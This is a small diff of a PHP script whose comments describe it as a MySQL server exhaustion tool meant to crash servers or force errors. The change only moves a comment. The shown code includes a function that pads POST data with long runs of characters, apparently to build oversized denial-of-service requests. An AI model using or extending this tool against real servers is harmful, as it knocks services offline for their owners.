@@ -5,8 +5,6 @@
 // MySQL Server Exhaustion.
 // Many possible outcomes, such as server-crash, or spitting out unwanted errors.
 
-// Sanitize the POST data being sent to the server.
-
 echo "
  _______         __                       __   
 |    ___|.--.--.|  |--.---.-.--.--.-----.|  |_ 
@@ -14,6 +12,7 @@ echo "
 |_______||__.__||__|__|___._|_____|_____||____| by DP.\n\n";
 
 
+// Sanitize the POST data being sent to the server.
 function sanitizePost($postdata, $numchars) {
 	return str_replace("(%)", str_repeat("A", $numchars), $postdata);
 }
@@ -47,6 +46,7 @@ if(isset($argv[1], $argv[2], $argv[3])) {
 	exit();
 
 }
+
 
 else {
 
